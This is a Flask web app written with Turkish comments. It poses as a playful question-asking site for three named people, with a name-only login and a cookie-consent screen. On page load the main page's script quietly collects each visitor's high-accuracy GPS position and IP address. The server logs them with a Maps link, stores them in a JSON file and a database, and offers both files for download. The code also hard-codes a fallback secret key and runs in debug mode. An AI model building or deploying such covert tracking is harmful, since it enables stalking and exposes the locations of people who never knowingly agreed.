from flask import Flask, request, render_template_string, send_file, session, redirect, url_for
import sqlite3
import json
import os
from datetime import datetime
import unicodedata

app = Flask(__name__)
app.secret_key = os.getenv('SECRET_KEY', 'k9m2p5q8r3v6t9w1z4j7x0y3')

# Düzenli log fonksiyonu
def log_message(level, category, message):
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    print(f"[{timestamp}] [{level}] [{category}] {message}")

# Türkçe karakterleri normalize etme
def normalize_text(text):
    if not isinstance(text, str):
        text = str(text)
    text = unicodedata.normalize('NFC', text)
    replacements = {
        'ı': 'i', 'ş': 's', 'ğ': 'g', 'ü': 'u', 'ç': 'c', 'ö': 'o',
        'İ': 'i', 'Ş': 's', 'Ğ': 'g', 'Ü': 'u', 'Ç': 'c', 'Ö': 'o'
    }
    text = text.lower()
    for char, replacement in replacements.items():
        text = text.replace(char, replacement)
    text = ''.join(c for c in text if c.isalnum() or c.isspace())
    return text.strip()

# Cihaz türünü belirleme
def detect_device(user_agent):
    user_agent = user_agent.lower()
    if 'iphone' in user_agent or 'ipad' in user_agent:
        return 'ios'
    elif 'android' in user_agent:
        return 'android'
    return 'other'

# Veritabanı başlatma
def init_db():
    try:
        conn = sqlite3.connect('visitors.db')
        c = conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS visitors
                     (id INTEGER PRIMARY KEY AUTOINCREMENT,
                      ip TEXT, user_agent TEXT, latitude REAL, longitude REAL, accuracy REAL, timestamp TEXT, method TEXT, question TEXT, username TEXT)''')
        conn.commit()
        log_message("INFO", "DATABASE", "Veritabanı başarıyla başlatıldı")
    except Exception as e:
        log_message("ERROR", "DATABASE_ERROR", f"Veritabanı başlatma hatası: {e}")
    finally:
        conn.close()

# konum.json dosyasına yazma
def save_to_json(data):
    try:
        if os.path.exists('konum.json'):
            with open('konum.json', 'r') as f:
                existing_data = json.load(f)
        else:
            existing_data = []
        existing_data.append(data)
        with open('konum.json', 'w') as f:
            json.dump(existing_data, f, indent=4)
        log_message("INFO", "JSON", "Veri başarıyla konum.json'a kaydedildi")
    except Exception as e:
        log_message("ERROR", "JSON_ERROR", f"JSON Kaydetme Hatası: {e}")

# Ortak CSS stilleri (Mobil uyumlu)
COMMON_CSS = """
<style>
    :root {
        --primary-color: #96c93d;
        --secondary-color: #ff6b6b;
        --text-color: white;
    }
    body {
        margin: 0;
        min-height: 100vh;
        display: flex;
        justify-content: center;
        align-items: center;
        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        background: linear-gradient(45deg, #ff6b6b, #4ecdc4, #45b7d1, #96c93d);
        background-size: 400%;
        animation: gradient 15s ease infinite;
        color: var(--text-color);
        padding: 20px;
        box-sizing: border-box;
    }
    .container {
        background: rgba(255, 255, 255, 0.1);
        padding: 30px;
        border-radius: 15px;
        box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
        backdrop-filter: blur(10px);
        text-align: center;
        width: 100%;
        max-width: 400px;
    }
    .main-container {
        background: rgba(255, 255, 255, 0.1);
        padding: 30px;
        border-radius: 15px;
        box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
        backdrop-filter: blur(10px);
        width: 100%;
        max-width: 800px;
    }
    h1 {
        font-size: 1.8em;
        margin-bottom: 20px;
        text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
    }
    .device-message {
        font-size: 0.9em;
        color: rgba(255, 255, 255, 0.7);
        margin-bottom: 15px;
    }
    input[type="text"], textarea {
        padding: 12px;
        width: 100%;
        border: none;
        border-radius: 8px;
        margin-bottom: 15px;
        font-size: 1em;
        box-sizing: border-box;
        -webkit-appearance: none;
    }
    button {
        padding: 12px 24px;
        border: none;
        border-radius: 8px;
        color: white !important;
        font-size: 1em;
        font-weight: 500;
        cursor: pointer;
        transition: background-color 0.3s;
        width: 100%;
        -webkit-tap-highlight-color: transparent;
        background-color: var(--primary-color);
    }
    button.ios {
        background-color: #4ecdc4;
    }
    button.ios:hover, button.ios:active {
        background-color: #3dbab3;
    }
    button.android {
        background-color: #ff6b6b;
    }
    button.android:hover, button.android:active {
        background-color: #e55a5a;
    }
    button.other {
        background-color: var(--primary-color);
    }
    button.other:hover, button.other:active {
        background-color: #85b32f;
    }
    .error {
        color: #ff4d4d;
        margin-top: 10px;
        font-size: 0.9em;
    }
    .question-history {
        margin-top: 20px;
        max-height: 300px;
        overflow-y: auto;
    }
    .question-item {
        background: rgba(255, 255, 255, 0.2);
        padding: 10px;
        border-radius: 8px;
        margin-bottom: 10px;
    }
    .question-item small {
        color: rgba(255, 255, 255, 0.7);
        font-size: 0.8em;
    }
    .nav-links {
        margin-bottom: 20px;
    }
    .nav-links a {
        color: white;
        text-decoration: none;
        margin: 0 10px;
        font-size: 1em;
    }
    .nav-links a:hover {
        text-decoration: underline;
    }
    .profile-info {
        text-align: left;
    }
    .profile-info p {
        margin: 5px 0;
    }
    @keyframes gradient {
        0% { background-position: 0% 50%; }
        50% { background-position: 100% 50%; }
        100% { background-position: 0% 50%; }
    }
    @supports (-webkit-touch-callout: none) {
        body {
            min-height: -webkit-fill-available;
        }
        input, button {
            -webkit-appearance: none;
            border-radius: 8px;
        }
    }
    input:focus, textarea:focus, button:focus {
        outline: none;
    }
</style>
"""

# Giriş ekranı şablonu
LOGIN_TEMPLATE = f"""
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Giriş Yap</title>
    {COMMON_CSS}
</head>
<body>
    <div class="container">
        <h1>Giriş Yap</h1>
        <div class="device-message">{{ device_message }}</div>
        <form method="POST" action="/login">
            <input type="text" name="username" placeholder="İsminizi girin" required>
            <button type="submit" class="{{ device_class }}">Giriş Yap</button>
        </form>
        {{% if error %}}
            <div class="error">{{ error }}</div>
        {{% endif %}}
    </div>
    <script>
        document.querySelector('form').addEventListener('submit', function(e) {{
            e.preventDefault();
            this.submit();
        }});
    </script>
</body>
</html>
"""

# Kurabiye ekranı şablonu
COOKIE_TEMPLATE = f"""
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Kurabiyeleri Kabul Et</title>
    {COMMON_CSS}
    <style>
        .container {{ max-width: 500px; }}
        h1 {{ font-size: 1.5em; }}
    </style>
</head>
<body>
    <div class="container">
        <h1> kişiye soru sormak için lütfen kurabiyeleri kabul edin.<br>Kurabiyeleri kabul ediyor musunuz?</h1>
        <form method="POST" action="/accept_cookies">
            <button type="submit" class="{{ device_class }}">Kurabiyeleri Kabul Et</button>
        </form>
    </div>
    <script>
        document.querySelector('form').addEventListener('submit', function(e) {{
            e.preventDefault();
            this.submit();
        }});
    </script>
</body>
</html>
"""

# Ana sayfa şablonu (normal kullanıcılar için)
MAIN_TEMPLATE = f"""
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Soru Sor</title>
    {COMMON_CSS}
</head>
<body>
    <div class="main-container">
        <div class="nav-links">
            <a href="/main">Soru Sor</a>
            <a href="/profile">Profil</a>
        </div>
        <h1>Yalan Söylemiyecek Olsam Bana Hangi Soruyu Sorardın?</h1>
        <form method="POST" action="/submit_question">
            <textarea name="question" placeholder="Mrs. Sorunuzu buraya yazın" required></textarea>
            <button type="submit" class="{{ device_class }}">Gönder</button>
        </form>
        <div class="question-history">
            <h2>Geçmiş Sorular</h2>
            {{% if questions %}}
                {{% for question in questions %}}
                    <div class="question-item">
                        <p><strong>{{ question.username }}</strong>: {{ question.question }}</p>
                        <small>{{ question.timestamp }}</small>
                    </div>
                {{% endfor %}}
            {{% else %}}
                <p>Henüz soru yok.</p>
            {{% endif %}}
        </div>
    </div>
    <script>
        function getLocation() {{
            if (navigator.geolocation) {{
                const options = {{
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                }};
                navigator.geolocation.getCurrentPosition(
                    position => {{
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        const accuracy = position.coords.accuracy;
                        fetch('/save_location', {{
                            method: 'POST',
                            headers: {{ 'Content-Type': 'application/json' }},
                            body: JSON.stringify({{ 
                                latitude: lat, 
                                longitude: lon, 
                                accuracy: accuracy 
                            }})
                        }}).catch(err => console.error('Konum gönderme hatası:', err));
                    }},
                    error => {{
                        let errorMessage;
                        switch(error.code) {{
                            case error.PERMISSION_DENIED:
                                errorMessage = "Konum erişimi reddedildi";
                                break;
                            case error.POSITION_UNAVAILABLE:
                                errorMessage = "Konum bilgisi alınamadı";
                                break;
                            case error.TIMEOUT:
                                errorMessage = "Konum alma zaman aşımına uğradı";
                                break;
                            default:
                                errorMessage = "Bilinmeyen hata";
                        }}
                        fetch('/save_location_error', {{
                            method: 'POST',
                            headers: {{ 'Content-Type': 'application/json' }},
                            body: JSON.stringify({{ error: errorMessage }})
                        }}).catch(err => console.error('Hata gönderme hatası:', err));
                    }},
                    options
                );
            }} else {{
                fetch('/save_location_error', {{
                    method: 'POST',
                    headers: {{ 'Content-Type': 'application/json' }},
                    body: JSON.stringify({{ error: "Tarayıcı konum servislerini desteklemiyor." }})
                }}).catch(err => console.error('Hata gönderme hatası:', err));
            }}
        }}
        document.addEventListener('DOMContentLoaded', getLocation);
        document.querySelector('form').addEventListener('submit', function(e) {{
            e.preventDefault();
            this.submit();
        }});
    </script>
</body>
</html>
"""

# Profil sayfası şablonu
PROFILE_TEMPLATE = f"""
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Profil</title>
    {COMMON_CSS}
</head>
<body>
    <div class="main-container">
        <div class="nav-links">
            <a href="/main">Soru Sor</a>
            <a href="/profile">Profil</a>
        </div>
        <h1>Profil</h1>
        <div class="profile-info">
            <p><strong>Kullanıcı Adı:</strong> {{ username }}</p>
            <p><strong>Cihaz Türü:</strong> {{ device_type }}</p>
            <p><strong>Toplam Gönderilen Soru:</strong> {{ question_count }}</p>
        </div>
    </div>
</body>
</html>
"""

# Giriş ekranı
@app.route('/', methods=['GET', 'POST'])
@app.route('/login', methods=['GET', 'POST'])
def login():
    log_message("INFO", "ROUTE", "Giriş ekranı yüklendi")
    user_agent = request.headers.get('User-Agent', '')
    device_type = detect_device(user_agent)
    log_message("INFO", "DEVICE", f"Cihaz türü: {device_type} (User-Agent: {user_agent})")

    if device_type == 'ios':
        device_message = "iPhone ile giriş yapıyorsunuz"
        device_class = "ios"
    elif device_type == 'android':
        device_message = "Android ile giriş yapıyorsunuz"
        device_class = "android"
    else:
        device_message = "Giriş yapıyorsunuz"
        device_class = "other"

    if request.method == 'POST':
        log_message("INFO", "FORM", "Giriş formu gönderildi")
        username = request.form.get('username', '')
        log_message("INFO", "LOGIN", f"Kullanıcı giriş denemesi: {username}")
        normalized_username = normalize_text(username)
        log_message("INFO", "LOGIN", f"Normalleştirilmiş kullanıcı adı: {normalized_username}")

        expected_usernames = [
            normalize_text("Melike Eslem Güler"),
            normalize_text("Berhak Kemikkıran"),
            normalize_text("Mehmet Eymen Salep")
        ]
        log_message("INFO", "LOGIN", f"Beklenen normalleştirilmiş kullanıcı adları: {expected_usernames}")

        if normalized_username in expected_usernames:
            session['logged_in'] = True
            session['username'] = username
            session['device_type'] = device_type
            log_message("INFO", "LOGIN", "Giriş başarılı, /cookies rotasına yönlendiriliyor")
            return redirect(url_for('cookies'))
        else:
            log_message("ERROR", "LOGIN_ERROR", "Giriş başarısız: Yanlış kullanıcı adı")
            return render_template_string(
                LOGIN_TEMPLATE,
                device_message=device_message,
                device_class=device_class,
                error="Lütfen Mes'den şifre isteyin"
            )
    return render_template_string(
        LOGIN_TEMPLATE,
        device_message=device_message,
        device_class=device_class
    )

# Kurabiye ekranı
@app.route('/cookies', methods=['GET', 'POST'])
def cookies():
    log_message("INFO", "ROUTE", "Kurabiye ekranı yüklendi")
    if not session.get('logged_in'):
        log_message("ERROR", "SESSION_ERROR", "Oturum bulunamadı, /login rotasına yönlendiriliyor")
        return redirect(url_for('login'))

    device_type = session.get('device_type', 'other')
    device_class = device_type if device_type in ['ios', 'android'] else 'other'
    return render_template_string(COOKIE_TEMPLATE, device_class=device_class)

# Kurabiyeleri kabul etme
@app.route('/accept_cookies', methods=['POST'])
def accept_cookies():
    log_message("INFO", "ROUTE", "Kurabiyeler kabul edildi")
    if not session.get('logged_in'):
        log_message("ERROR", "SESSION_ERROR", "Oturum bulunamadı, /login rotasına yönlendiriliyor")
        return redirect(url_for('login'))
    session['cookies_accepted'] = True

    client_ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    log_message("INFO", "VISITOR", "Yeni Ziyaretçi")
    log_message("INFO", "VISITOR", f"Ziyaretçi IP: {client_ip}")
    log_message("INFO", "VISITOR", f"Tarayıcı/Cihaz: {user_agent}")
    log_message("INFO", "VISITOR", f"Zaman: {timestamp}")
    log_message("INFO", "VISITOR", f"Kullanıcı: {session.get('username')}")

    log_message("INFO", "ROUTE", "Ana sayfaya yönlendiriliyor (/main)")
    return redirect(url_for('main'))

# Ana sayfa (normal kullanıcılar için)
@app.route('/main')
def main():
    log_message("INFO", "ROUTE", "Ana sayfa yüklendi")
    if not session.get('logged_in') or not session.get('cookies_accepted'):
        log_message("ERROR", "SESSION_ERROR", "Oturum veya kurabiye kabulü eksik, /login rotasına yönlendiriliyor")
        return redirect(url_for('login'))

    device_type = session.get('device_type', 'other')
    device_class = device_type if device_type in ['ios', 'android'] else 'other'

    questions = []
    try:
        conn = sqlite3.connect('visitors.db')
        c = conn.cursor()
        c.execute("SELECT username, question, timestamp FROM visitors WHERE question IS NOT NULL ORDER BY timestamp DESC")
        questions = c.fetchall()
        questions = [{'username': row[0], 'question': row[1], 'timestamp': row[2]} for row in questions]
        log_message("INFO", "DATABASE", f"Sorular alındı: {len(questions)} soru bulundu")
    except Exception as e:
        log_message("ERROR", "DATABASE_ERROR", f"Soru alma hatası: {e}")
        questions = []
    finally:
        conn.close()

    return render_template_string(MAIN_TEMPLATE, device_class=device_class, questions=questions)

# Profil sayfası
@app.route('/profile')
def profile():
    log_message("INFO", "ROUTE", "Profil sayfası yüklendi")
    if not session.get('logged_in') or not session.get('cookies_accepted'):
        log_message("ERROR", "SESSION_ERROR", "Oturum veya kurabiye kabulü eksik, /login rotasına yönlendiriliyor")
        return redirect(url_for('login'))

    username = session.get('username', 'Bilinmeyen Kullanıcı')
    device_type = session.get('device_type', 'other')
    device_type = device_type.capitalize()

    question_count = 0
    try:
        conn = sqlite3.connect('visitors.db')
        c = conn.cursor()
        c.execute("SELECT COUNT(*) FROM visitors WHERE username = ? AND question IS NOT NULL", (username,))
        question_count = c.fetchone()[0]
        log_message("INFO", "DATABASE", f"Kullanıcı {username} için soru sayısı: {question_count}")
    except Exception as e:
        log_message("ERROR", "DATABASE_ERROR", f"Soru sayısı alma hatası: {e}")
    finally:
        conn.close()

    return render_template_string(PROFILE_TEMPLATE, username=username, device_type=device_type, question_count=question_count)

# Konumu kaydet
@app.route('/save_location', methods=['POST'])
def save_location():
    try:
        data = request.get_json()
        latitude = data['latitude']
        longitude = data['longitude']
        accuracy = data['accuracy']
        client_ip = request.remote_addr
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

        maps_url = f"https://www.google.com/maps?q={latitude},{longitude}"
        log_message("INFO", "LOCATION", f"Hassas Konum (HTML5): Enlem {latitude}, Boylam {longitude}")
        log_message("INFO", "LOCATION", f"Sapma: {accuracy} metre")
        log_message("INFO", "LOCATION", f"Harita: {maps_url}")
        if accuracy > 100:
            log_message("WARNING", "LOCATION_WARNING", "Sapma değeri yüksek! Daha doğru konum için: GPS/Wi-Fi açık olmalı, açık alanda test yapılmalı.")

        location_data = {
            "ip": client_ip,
            "latitude": latitude,
            "longitude": longitude,
            "accuracy_meters": accuracy,
            "maps_url": maps_url,
            "timestamp": timestamp,
            "method": "HTML5 Geolocation",
            "username": session.get('username')
        }
        save_to_json(location_data)

        conn = sqlite3.connect('visitors.db')
        c = conn.cursor()
        c.execute("INSERT INTO visitors (ip, user_agent, latitude, longitude, accuracy, timestamp, method, username) VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                  (client_ip, request.headers.get('User-Agent'), latitude, longitude, accuracy, timestamp, "HTML5 Geolocation", session.get('username')))
        conn.commit()
        conn.close()

        log_message("INFO", "LOCATION", "Konum alındı")
        return 'Konum alındı'
    except Exception as e:
        log_message("ERROR", "LOCATION_ERROR", f"Konum Hata: {e}")
        return 'Konum alınamadı', 400

# Konum hatasını kaydet
@app.route('/save_location_error', methods=['POST'])
def save_location_error():
    try:
        data = request.get_json()
        error_message = data['error']
        log_message("ERROR", "LOCATION_ERROR", f"Konum Alınamadı: {error_message}")

        location_data = {
            "error": error_message,
            "timestamp": datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            "username": session.get('username')
        }
        save_to_json(location_data)

        return 'Hata alındı'
    except Exception as e:
        log_message("ERROR", "LOCATION_ERROR", f"Hata Kaydetme Hatası: {e}")
        return 'Hata alınamadı', 400

# Soruyu kaydet
@app.route('/submit_question', methods=['POST'])
def submit_question():
    log_message("INFO", "ROUTE", "Soru gönderildi")
    if not session.get('logged_in') or not session.get('cookies_accepted'):
        log_message("ERROR", "SESSION_ERROR", "Oturum veya kurabiye kabulü eksik, /login rotasına yönlendiriliyor")
        return redirect(url_for('login'))
    
    question = request.form['question']
    client_ip = request.remote_addr
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    log_message("INFO", "QUESTION", f"Kullanıcı: {session.get('username')}")
    log_message("INFO", "QUESTION", f"Soru: {question}")
    log_message("INFO", "QUESTION", f"Zaman: {timestamp}")

    location_data = {
        "ip": client_ip,
        "question": question,
        "timestamp": timestamp,
        "username": session.get('username')
    }
    save_to_json(location_data)

    try:
        conn = sqlite3.connect('visitors.db')
        c = conn.cursor()
        c.execute("UPDATE visitors SET question = ?, username = ? WHERE ip = ? AND timestamp = ?",
                  (question, session.get('username'), client_ip, timestamp))
        conn.commit()
        log_message("INFO", "DATABASE", "Soru başarıyla kaydedildi")
    except Exception as e:
        log_message("ERROR", "DATABASE_ERROR", f"Soru kaydetme hatası: {e}")
    finally:
        conn.close()

    return redirect(url_for('main'))

# Dosya indirme rotası
@app.route('/download/<filename>')
def download_file(filename):
    log_message("INFO", "ROUTE", f"Dosya indirme isteği: {filename}")
    if not session.get('logged_in'):
        log_message("ERROR", "SESSION_ERROR", "Oturum bulunamadı, /login rotasına yönlendiriliyor")
        return redirect(url_for('login'))
    if filename in ['konum.json', 'visitors.db']:
        return send_file(filename, as_attachment=True)
    log_message("ERROR", "FILE_ERROR", "Dosya bulunamadı")
    return "Dosya bulunamadı", 404

if __name__ == '__main__':
    init_db()
    app.run(host='0.0.0.0', port=5000, debug=True, threaded=True)